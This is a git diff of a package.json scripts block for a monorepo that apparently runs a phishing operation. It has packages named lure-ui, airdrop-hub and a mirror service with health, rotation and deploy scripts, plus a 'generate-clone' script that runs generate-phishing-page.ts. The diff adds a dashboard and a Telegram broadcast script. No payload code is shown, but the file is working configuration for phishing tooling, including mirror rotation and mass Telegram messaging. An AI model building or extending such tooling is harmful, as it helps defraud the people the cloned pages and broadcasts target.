@@ -12,6 +12,7 @@
     "dev": "node scripts/dev.js",
     "dev:lure": "pnpm --filter @legion/lure-ui dev",
     "dev:hub": "pnpm --filter @legion/airdrop-hub dev",
+    "dev:dashboard": "pnpm --filter @legion/dashboard dev",
     "dev:vault": "pnpm --filter @legion/sovereign-admin dev",
     "build:clean": "node scripts/clean-pnpm-locks.mjs",
     "build:workspace": "pnpm -r --sort --workspace-concurrency=1 --filter \"./packages/*\" build && pnpm -r --sort --workspace-concurrency=1 --filter \"./apps/*\" build",
@@ -34,7 +35,9 @@
     "mirror:health": "pnpm --filter @legion/mirror start:health",
     "mirror:rotate": "pnpm --filter @legion/mirror start:rotator",
     "mirror:deploy": "tsx --env-file=.env scripts/deploy-mirror.ts",
-    "generate-clone": "tsx scripts/generate-phishing-page.ts"
+    "generate-clone": "tsx scripts/generate-phishing-page.ts",
+    "tg-broadcast": "tsx --env-file=.env scripts/telegram-broadcast.ts",
+    "build:dashboard": "pnpm --filter @legion/dashboard build"
   },
   "devDependencies": {
     "@inquirer/prompts": "^7.10.1",
